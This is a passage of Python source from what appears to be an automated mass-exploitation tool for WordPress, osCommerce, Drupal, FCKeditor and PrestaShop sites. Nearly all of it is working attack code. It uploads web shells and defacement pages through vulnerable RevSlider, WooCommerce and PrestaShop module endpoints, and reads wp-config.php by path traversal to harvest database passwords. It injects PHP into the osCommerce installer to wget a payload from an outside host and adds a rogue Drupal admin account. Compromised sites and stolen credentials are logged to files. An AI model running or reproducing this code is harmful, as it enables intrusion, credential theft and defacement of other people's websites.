                                   'framework/plugins/revslider/temp/update_extract/spy.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/ultimatum/' in CheckRevslider.text:
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
                CheckRev4 = requests.get('http://' + site +
                                         '/wp-content/themes/ultimatum/wonderfoundry/'
                                         'addons/plugins/revslider/temp/update_extract/spy.gif',
                                         timeout=5, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckRev4.text:
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/ultimatum/wonderfoundry/'
                                              'addons/plugins/revslider/temp/update_extract/vuln.php',
                                              timeout=5, headers=self.Headers)
                    if 'SpyUploaderV1' in ShellCheck.text:
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/ultimatum/wonderfoundry/addons/'
                                   'plugins/revslider/temp/update_extract/vuln.php')
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/ultimatum/wonderfoundry/'
                                       'addons/plugins/revslider/temp/update_extract/vuln.php' + '\n')
                    self.Print_Vuln_index(
                        site + '/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/'
                               'revslider/temp/update_extract/spy.gif')
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/'
                                   'revslider/temp/update_extract/spy.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/medicate/' in CheckRevslider.text:
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
                CheckRev5 = requests.get('http://' + site +
                                         '/wp-content/themes/medicate/script/'
                                         'revslider/temp/update_extract/spy.gif', timeout=10, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckRev5.text:
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/medicate/script/revslider/'
                                              'temp/update_extract/vuln.php', timeout=10, headers=self.Headers)
                    if 'SpyUploaderV1' in ShellCheck.text:
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/medicate/script/'
                                   'revslider/temp/update_extract/vuln.php')
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/medicate/script/'
                                       'revslider/temp/update_extract/vuln.php' + '\n')
                    self.Print_Vuln_index(
                        site + '/wp-content/themes/medicate/script/revslider/temp/update_extract/spy.gif')
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/medicate/script/revslider/'
                                   'temp/update_extract/spy.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/centum/' in CheckRevslider.text:
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
                CheckRev6 = requests.get('http://' + site +
                                         '/wp-content/themes/centum/revslider/'
                                         'temp/update_extract/spy.gif', timeout=10, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckRev6.text:
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/centum/revslider/'
                                              'temp/update_extract/vuln.php', timeout=10, headers=self.Headers)
                    if 'SpyUploaderV1' in ShellCheck.text:
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/centum/revslider/temp/update_extract/vuln.php')
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/centum/revslider/temp/update_extract/vuln.php' + '\n')
                    self.Print_Vuln_index(site + '/wp-content/themes/centum/revslider/temp/update_extract/spy.gif')
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/centum/revslider/temp/update_extract/spy.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/beach_apollo/' in CheckRevslider.text:
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
                CheckRev7 = requests.get('http://' + site +
                                         '/wp-content/themes/beach_apollo/advance/plugins/'
                                         'revslider/temp/update_extract/spy.gif', timeout=10, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckRev7.text:
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/beach_apollo/advance/plugins/'
                                              'revslider/temp/update_extract/vuln.php', timeout=10, headers=self.Headers)
                    if 'SpyUploaderV1' in ShellCheck.text:
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/beach_apollo/advance/plugins/'
                                   'revslider/temp/update_extract/vuln.php')
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/beach_apollo/advance/plugins/'
                                       'revslider/temp/update_extract/vuln.php' + '\n')
                    self.Print_Vuln_index(
                        site + '/wp-content/themes/beach_apollo/advance/plugins/'
                               'revslider/temp/update_extract/spy.gif')
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/beach_apollo/advance/plugins/'
                                   'revslider/temp/update_extract/spy.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/cuckootap/' in CheckRevslider.text:
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
                CheckRev8 = requests.get('http://' + site +
                                         '/wp-content/themes/cuckootap/framework/plugins/'
                                         'revslider/temp/update_extract/spy.gif', timeout=10, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckRev8.text:
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/cuckootap/framework/plugins/'
                                              'revslider/temp/update_extract/vuln.php', timeout=10, headers=self.Headers)
                    if 'SpyUploaderV1' in ShellCheck.text:
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/cuckootap/framework/plugins/'
                                   'revslider/temp/update_extract/vuln.php')
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/cuckootap/framework/plugins/revslider/'
                                       'temp/update_extract/vuln.php' + '\n')
                    self.Print_Vuln_index(
                        site + '/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/spy.gif')
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/cuckootap/framework/plugins/'
                                   'revslider/temp/update_extract/spy.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/pindol/' in CheckRevslider.text:
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
                CheckRev9 = requests.get('http://' + site +
                                         '/wp-content/themes/pindol/revslider/'
                                         'temp/update_extract/spy.gif', timeout=10, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckRev9.text:
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/pindol/revslider/'
                                              'temp/update_extract/vuln.php', timeout=10, headers=self.Headers)
                    if 'SpyUploaderV1' in ShellCheck.text:
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/pindol/revslider/temp/update_extract/vuln.php')
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/pindol/revslider/temp/update_extract/vuln.php' + '\n')
                    self.Print_Vuln_index(site + '/wp-content/themes/pindol/revslider/temp/update_extract/spy.gif')
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/pindol/revslider/temp/update_extract/spy.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/designplus/' in CheckRevslider.text:
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
                CheckRev10 = requests.get('http://' + site +
                                          '/wp-content/themes/designplus/framework/plugins'
                                          '/revslider/temp/update_extract/spy.gif', timeout=10, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckRev10.text:
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/designplus/framework/plugins/'
                                              'revslider/temp/update_extract/vuln.php', timeout=10, headers=self.Headers)
                    if 'SpyUploaderV1' in ShellCheck.text:
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/designplus/framework/plugins/revslider/'
                                   'temp/update_extract/vuln.php')
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/designplus/framework/plugins/revslider/temp/'
                                       'update_extract/vuln.php' + '\n')
                    self.Print_Vuln_index(
                        site + '/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/spy.gif')
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/designplus/framework/plugins/revslider/'
                                   'temp/update_extract/spy.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/rarebird/' in CheckRevslider.text:
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
                CheckRev11 = requests.get('http://' + site +
                                          '/wp-content/themes/rarebird/framework/plugins/revslider/'
                                          'temp/update_extract/spy.gif', timeout=10, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckRev11.text:
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/rarebird/framework/plugins/revslider/temp'
                                              '/update_extract/vuln.php', timeout=10, headers=self.Headers)
                    if 'SpyUploaderV1' in ShellCheck.text:
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/rarebird/framework/plugins/revslider/temp/'
                                   'update_extract/vuln.php')
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/rarebird/framework/plugins/revslider/temp/'
                                       'update_extract/vuln.php' + '\n')
                    self.Print_Vuln_index(
                        site + '/wp-content/themes/rarebird/framework/plugins/revslider/temp/'
                               'update_extract/spy.gif')
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/rarebird/framework/plugins/revslider/temp/'
                                   'update_extract/spy.gif' + '\n')
                    self.Revslider_Config(site)

                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/Avada/' in CheckRevslider.text:
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
                CheckRev12 = requests.get('http://' + site +
                                          '/wp-content/themes/andre/framework/plugins/revslider/temp/'
                                          'update_extract/spy.gif', timeout=10, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckRev12.text:
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/andre/framework/plugins/revslider/temp/'
                                              'update_extract/vuln.php', timeout=10, headers=self.Headers)
                    if 'SpyUploaderV1' in ShellCheck.text:
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/vuln.php')
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/andre/framework/plugins/revslider/temp/'
                                       'update_extract/vuln.php' + '\n')
                    self.Print_Vuln_index(
                        site + '/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/spy.gif')
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/andre/framework/plugins/revslider/temp/'
                                   'update_extract/spy.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            else:
                self.Print_NotVuln('revslider', site)
        except:
            self.Print_NotVuln('revslider', site)

    def Revslider_Config(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php'
            GetConfig = requests.get(Exp, timeout=10, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('Exploited/AutoConfig.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('Exploited/AutoConfig.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n\n')
                    self.Revslider_css(site)
                except:
                    self.Revslider_css(site)
            else:
                self.Revslider_css(site)
        except:
            self.Revslider_css(site)

    def viral_optins(self, site):
        try:
            defaceFile = {
                'Filedata': ('spy.txt', open(self.TextindeX, 'rb'), 'text/html')
            }
            x = requests.post('http://' + site + '/wp-content/plugins/viral-optins/api/uploader/file-uploader.php',
                              files=defaceFile, timeout=5, headers=self.Headers)
            if 'id="wpvimgres"' in x.text:
                uploader = site + '/wp-content/uploads/20' + self.year + '/' + self.month + '/spy.txt'
                GoT = requests.get('http://' + uploader, timeout=5, headers=self.Headers)
                find = re.findall('<img src="http://(.*)" height="', x.text)
                GoT2 = requests.get('http://' + find[0], timeout=5, headers=self.Headers)
                if 'Hacked By Mister Spy' in GoT.text:
                    self.Print_Vuln_index(site + '/wp-content/uploads/20' + self.year + '/' + self.month + '/spy.txt')
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(site + '/wp-content/uploads/20' + self.year + '/' + self.month + '/spy.txt' + '\n')
                elif 'Hacked By Mister Spy' in GoT2.text:
                    self.Print_Vuln_index(find[0])
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(site + find[0] + '\n')
                else:
                    self.Print_NotVuln('viral optins', site)
            else:
                self.Print_NotVuln('viral optins', site)
        except:
            self.Print_NotVuln('viral optins', site)


    def Woocomrece(self, site):
        try:
            Exp = 'http://' + site + '/wp-admin/admin-ajax.php'
            Postdata = {'action': 'nm_personalizedproduct_upload_file', 'name': 'upload.php'}
            FileData = {'file': (self.pagelinesExploitShell.split('/')[1], open(self.pagelinesExploitShell, 'rb'),
                                 'multipart/form-data')}
            GoT = requests.post(Exp, files=FileData, data=Postdata, timeout=5, headers=self.Headers)
            if GoT.status_code == 200 or 'success' in GoT.text:
                UploadPostPath = 'http://' + site + '/wp-content/uploads/product_files/upload.php'
                CheckShell = requests.get(UploadPostPath, timeout=5, headers=self.Headers)
                if 'MrSpyUp!!' in CheckShell.text:
                    shellChecker = requests.get('http://' + site + '/wp-content/vuln.php',
                                                timeout=5, headers=self.Headers)
                    if 'SpyUploaderV1' in shellChecker.text:
                        self.Print_vuln_Shell(site + '/wp-content/vuln.php')
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(site + '/wp-content/vuln.php' + '\n')
                    IndexCheck = requests.get('http://' + site + '/vuln.htm', timeout=5, headers=self.Headers)
                    if 'spy0xProjectTop50' in IndexCheck.text:
                        self.Print_Vuln_index(site + '/vuln.htm')
                        with open('Exploited/Index.txt', 'a') as writer:
                            writer.write(site + '/vuln.htm' + '\n')
                    else:
                        self.Print_NotVuln('Woocomrece', site)
                else:
                    self.Print_NotVuln('Woocomrece', site)
            else:
                self.Print_NotVuln('Woocomrece', site)
        except:
            self.Print_NotVuln('Woocomrece', site)


    def FckPath(self, zzz):
        try:
            find = re.findall(',"(.*)","', zzz)
            path = find[0].strip()
            return path
        except:
            pass

    def FckEditor(self, site):
        try:
            exp2 = '/fckeditor/editor/filemanager/connectors/php/upload.php?Type=Media'
            try:
                CheckVuln = requests.get('http://' + site + exp2, timeout=5, headers=self.Headers)
                if 'OnUploadCompleted(202' in CheckVuln.text:
                    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0',
                               'Accept': '*/*'}
                    exp = 'http://' + site + exp2
                    po = {'Content_Type': 'form-data'}
                    fil = {'NewFile': open(self.Jce_Deface_image, 'rb')}
                    rr = requests.post(exp, data=po, headers=headers, timeout=10, files=fil)
                    if '.gif' in rr.text:
                        zart = self.FckPath(rr.text)
                        x = 'http://' + site + str(zart)
                        wcheck2 = requests.get(x, timeout=10, headers=self.Headers)
                        if wcheck2.status_code == 200:
                            check_deface = requests.get(x, timeout=10, headers=self.Headers)
                            if 'D9ABB614B8D911E3AB27A52B5ED2F278' in check_deface.text:
                                self.Print_Vuln_index(site + str(zart))
                                with open('Exploited/Index.txt', 'a') as writer:
                                    writer.write(site + str(zart) + '\n')
                            else:
                                self.Print_NotVuln('fckeditor', site)
                        else:
                            self.Print_NotVuln('fckeditor', site)
                    else:
                        self.Print_NotVuln('fckeditor', site)
                else:
                    self.Print_NotVuln('fckeditor', site)
            except:
                self.Print_NotVuln('fckeditor', site)
        except:
            self.Print_NotVuln('fckeditor', site)

    def Drupal_Sqli_Addadmin(self, site):
        os.system('cd Files && admindrup.py -t http://' + site + ' -u pwndrupal -p pwndrupal')

    def osCommercex(self, site):
        try:
            CheckVuln = requests.get('http://' + site + '/install/index.php', timeout=5, headers=self.Headers)
            if 'Welcome to osCommerce' in CheckVuln.text or CheckVuln.status_code == 200:
                Exp = site + '/install/install.php?step=4'
                data = {
                    'DIR_FS_DOCUMENT_ROOT': './'
                }
                shell = '\');'
                shell += 'system("wget https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/OsComPayLoad.php");'
                shell += '/*'
                deface = '\');'
                deface += 'system("echo Done patch it Now!> ../../vuln.htm");'
                deface += '/*'
                data['DB_DATABASE'] = deface
                r = requests.post(url='http://' + Exp, data=data, timeout=5, headers=self.Headers)
                if r.status_code == 200:
                    requests.get('http://' + site + '/install/includes/configure.php', timeout=5, headers=self.Headers)
                    CheckIndex = requests.get('http://' + site + '/vuln.htm', timeout=5, headers=self.Headers)
                    if 'spy0xProjectTop50' in CheckIndex.text:
                        self.Print_Vuln_index(site + '/vuln.htm')
                        with open('Exploited/Index.txt', 'a') as writer:
                            writer.write(site + '/spy.txt' + '\n')
                        try:
                            data['DB_DATABASE'] = shell
                            requests.post(url='http://' + Exp, data=data, timeout=5, headers=self.Headers)
                            requests.get('http://' + site + '/install/includes/configure.php',
                                         timeout=5, headers=self.Headers)
                            requests.get('http://' + site + '/install/includes/OsComPayLoad.php',
                                         timeout=5, headers=self.Headers)
                            Checkshell = requests.get('http://' + site + '/install/includes/vuln.php',
                                                      timeout=5, headers=self.Headers)
                            if 'SpyUploaderV1' in Checkshell.text:
                                self.Print_vuln_Shell(site + '/wp-content/vuln.php')
                                with open('Exploited/Shells.txt', 'a') as writer:
                                    writer.write(site + '/wp-content/vuln.php' + '\n')
                        except:
                            pass
                    else:
                        self.Print_NotVuln('osCommerce RCE', site)
                else:
                    self.Print_NotVuln('osCommerce RCE', site)
            else:
                self.Print_NotVuln('osCommerce RCE', site)
        except:
            self.Print_NotVuln('osCommerce RCE', site)

    def columnadverts(self, site):
        try:
            Exp = site + '/modules/columnadverts/uploadimage.php'
            FileDataIndex = {'userfile': open(self.Jce_Deface_image, 'rb')}
            FileDataShell = {'userfile': open(self.ShellPresta, 'rb')}
            GoT = requests.post('http://' + Exp, files=FileDataIndex, timeout=5, headers=self.Headers)
            if 'success' in GoT.text:
                IndexPath = '/modules/columnadverts/slides/' + self.Jce_Deface_image.split('/')[1]
                CheckIndex = requests.get('http://' + site + IndexPath, timeout=5, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    self.Print_Vuln_index(IndexPath)
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                    requests.post('http://' + Exp, files=FileDataShell, timeout=5, headers=self.Headers)
                    ShellPath = '/modules/columnadverts/slides/' + self.ShellPresta.split('/')[1]
                    CheckShell = requests.get('http://' + site + ShellPath, timeout=5, headers=self.Headers)
                    if 'MisterSpyv7up' in CheckShell.text:
                        self.Print_vuln_Shell(site + ShellPath)
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(site + ShellPath + '\n')
                else:
                    self.Print_NotVuln('columnadverts', site)
            else:
                self.Print_NotVuln('columnadverts', site)
        except:
            self.Print_NotVuln('columnadverts', site)

    def soopamobile(self, site):
        try:
            Exp = site + '/modules/soopamobile/uploadimage.php'
            FileDataIndex = {'userfile': open(self.Jce_Deface_image, 'rb')}
            FileDataShell = {'userfile': open(self.ShellPresta, 'rb')}
            GoT = requests.post('http://' + Exp, files=FileDataIndex, timeout=5, headers=self.Headers)
            if 'success' in GoT.text:
                IndexPath = '/modules/soopamobile/slides/' + self.Jce_Deface_image.split('/')[1]
                CheckIndex = requests.get('http://' + site + IndexPath, timeout=5, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    self.Print_Vuln_index(IndexPath)
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                    requests.post('http://' + Exp, files=FileDataShell, timeout=5, headers=self.Headers)
                    ShellPath = '/modules/soopamobile/slides/' + self.ShellPresta.split('/')[1]
                    CheckShell = requests.get('http://' + site + ShellPath, timeout=5, headers=self.Headers)
                    if 'MisterSpyv7up' in CheckShell.text:
                        self.Print_vuln_Shell(ShellPath)
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(ShellPath + '\n')
                else:
                    self.Print_NotVuln('soopamobile', site)
            else:
                self.Print_NotVuln('soopamobile', site)
        except:
            self.Print_NotVuln('soopamobile', site)


    def soopabanners(self, site):
        try:
            Exp = site + '/modules/soopabanners/uploadimage.php'
            FileDataIndex = {'userfile': open(self.Jce_Deface_image, 'rb')}
            FileDataShell = {'userfile': open(self.ShellPresta, 'rb')}
            GoT = requests.post('http://' + Exp, files=FileDataIndex, timeout=5, headers=self.Headers)
            if 'success' in GoT.text:
                IndexPath = '/modules/soopabanners/slides/' + self.Jce_Deface_image.split('/')[1]
                CheckIndex = requests.get('http://' + site + IndexPath, timeout=5, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    self.Print_Vuln_index(IndexPath)
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                    requests.post('http://' + Exp, files=FileDataShell, timeout=5, headers=self.Headers)
                    ShellPath = '/modules/soopabanners/slides/' + self.ShellPresta.split('/')[1]
                    CheckShell = requests.get('http://' + site + ShellPath, timeout=5, headers=self.Headers)
                    if 'MisterSpyv7up' in CheckShell.text:
                        self.Print_vuln_Shell(ShellPath)
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(ShellPath + '\n')
                else:
                    self.Print_NotVuln('soopabanners', site)
            else:
                self.Print_NotVuln('soopabanners', site)
        except:
            self.Print_NotVuln('soopabanners', site)


    def vtermslideshow(self, site):
        try:
            Exp = site + '/modules/vtermslideshow/uploadimage.php'
            FileDataIndex = {'userfile': open(self.Jce_Deface_image, 'rb')}
            FileDataShell = {'userfile': open(self.ShellPresta, 'rb')}
            GoT = requests.post('http://' + Exp, files=FileDataIndex, timeout=5, headers=self.Headers)
            if 'success' in GoT.text:
                IndexPath = '/modules/vtermslideshow/slides/' + self.Jce_Deface_image.split('/')[1]
                CheckIndex = requests.get('http://' + site + IndexPath, timeout=5, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    self.Print_Vuln_index(IndexPath)
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                    requests.post('http://' + Exp, files=FileDataShell, timeout=5, headers=self.Headers)
                    ShellPath = '/modules/vtermslideshow/slides/' + self.ShellPresta.split('/')[1]
                    CheckShell = requests.get('http://' + site + ShellPath, timeout=5, headers=self.Headers)
                    if 'Vuln!!' in CheckShell.text:
                        self.Print_vuln_Shell(ShellPath)
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(ShellPath + '\n')
                else:
                    self.Print_NotVuln('vtermslideshow', site)
            else:
                self.Print_NotVuln('vtermslideshow', site)
        except:
            self.Print_NotVuln('vtermslideshow', site)

    def simpleslideshow(self, site):
        try:
            Exp = site + '/modules/simpleslideshow/uploadimage.php'
            FileDataIndex = {'userfile': open(self.Jce_Deface_image, 'rb')}
            FileDataShell = {'userfile': open(self.ShellPresta, 'rb')}
            GoT = requests.post('http://' + Exp, files=FileDataIndex, timeout=5, headers=self.Headers)
            if 'success' in GoT.text:
                IndexPath = '/modules/simpleslideshow/slides/' + self.Jce_Deface_image.split('/')[1]
                CheckIndex = requests.get('http://' + site + IndexPath, timeout=5, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    self.Print_Vuln_index(IndexPath)
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                    requests.post('http://' + Exp, files=FileDataShell, timeout=5, headers=self.Headers)
                    ShellPath = '/modules/simpleslideshow/slides/' + self.ShellPresta.split('/')[1]
                    CheckShell = requests.get('http://' + site + ShellPath, timeout=5, headers=self.Headers)
                    if 'MisterSpyv7up' in CheckShell.text:
                        self.Print_vuln_Shell(ShellPath)
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(ShellPath + '\n')
                else:
                    self.Print_NotVuln('simpleslideshow', site)
            else:
                self.Print_NotVuln('simpleslideshow', site)
        except:
            self.Print_NotVuln('simpleslideshow', site)

    def productpageadverts(self, site):
        try:
            Exp = site + '/modules/productpageadverts/uploadimage.php'
            FileDataIndex = {'userfile': open(self.Jce_Deface_image, 'rb')}
            FileDataShell = {'userfile': open(self.ShellPresta, 'rb')}
            GoT = requests.post('http://' + Exp, files=FileDataIndex, timeout=5, headers=self.Headers)
            if 'success' in GoT.text:
                IndexPath = '/modules/productpageadverts/slides/' + self.Jce_Deface_image.split('/')[1]
                CheckIndex = requests.get('http://' + site + IndexPath, timeout=5, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    self.Print_Vuln_index(IndexPath)
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                    requests.post('http://' + Exp, files=FileDataShell, timeout=5, headers=self.Headers)
                    ShellPath = '/modules/productpageadverts/slides/' + self.ShellPresta.split('/')[1]
                    CheckShell = requests.get('http://' + site + ShellPath, timeout=5, headers=self.Headers)
                    if 'MisterSpyv7up' in CheckShell.text:
                        self.Print_vuln_Shell(ShellPath)
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(ShellPath + '\n')
                else:
                    self.Print_NotVuln('productpageadverts', site)
            else:
                self.Print_NotVuln('productpageadverts', site)
        except:
            self.Print_NotVuln('productpageadverts', site)

    def homepageadvertise(self, site):
        try:
            Exp = site + '/modules/homepageadvertise/uploadimage.php'
            FileDataIndex = {'userfile': open(self.Jce_Deface_image, 'rb')}
            FileDataShell = {'userfile': open(self.ShellPresta, 'rb')}
            GoT = requests.post('http://' + Exp, files=FileDataIndex, timeout=5, headers=self.Headers)
            if 'success' in GoT.text:
                IndexPath = '/modules/homepageadvertise/slides/' + self.Jce_Deface_image.split('/')[1]
                CheckIndex = requests.get('http://' + site + IndexPath, timeout=5, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    self.Print_Vuln_index(IndexPath)
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                    requests.post('http://' + Exp, files=FileDataShell, timeout=5, headers=self.Headers)
                    ShellPath = '/modules/homepageadvertise/slides/' + self.ShellPresta.split('/')[1]
                    CheckShell = requests.get('http://' + site + ShellPath, timeout=5, headers=self.Headers)
                    if 'MisterSpyv7up' in CheckShell.text:
                        self.Print_vuln_Shell(ShellPath)
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(ShellPath + '\n')
                else:
                    self.Print_NotVuln('homepageadvertise', site)
            else:
                self.Print_NotVuln('homepageadvertise', site)
        except:
            self.Print_NotVuln('homepageadvertise', site)

    def homepageadvertise2(self, site):
        try:
            Exp = site + '/modules/homepageadvertise2/uploadimage.php'
            FileDataIndex = {'userfile': open(self.Jce_Deface_image, 'rb')}
            FileDataShell = {'userfile': open(self.ShellPresta, 'rb')}
            GoT = requests.post('http://' + Exp, files=FileDataIndex, timeout=5, headers=self.Headers)
            if 'success' in GoT.text:
                IndexPath = '/modules/homepageadvertise2/slides/' + self.Jce_Deface_image.split('/')[1]
                CheckIndex = requests.get('http://' + site + IndexPath, timeout=5, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    self.Print_Vuln_index(IndexPath)
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                    requests.post('http://' + Exp, files=FileDataShell, timeout=5, headers=self.Headers)
                    ShellPath = '/modules/homepageadvertise2/slides/' + self.ShellPresta.split('/')[1]
                    CheckShell = requests.get('http://' + site + ShellPath, timeout=5, headers=self.Headers)
                    if 'MisterSpyv7up' in CheckShell.text:
                        self.Print_vuln_Shell(ShellPath)
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(ShellPath + '\n')
                else:
                    self.Print_NotVuln('homepageadvertise2', site)
            else:
                self.Print_NotVuln('homepageadvertise2', site)
        except:
            self.Print_NotVuln('homepageadvertise2', site)

    def jro_homepageadvertise(self, site):
        try:
            Exp = site + '/modules/jro_homepageadvertise/uploadimage.php'
            FileDataIndex = {'userfile': open(self.Jce_Deface_image, 'rb')}
            FileDataShell = {'userfile': open(self.ShellPresta, 'rb')}
            GoT = requests.post('http://' + Exp, files=FileDataIndex, timeout=5, headers=self.Headers)
            if 'success' in GoT.text:
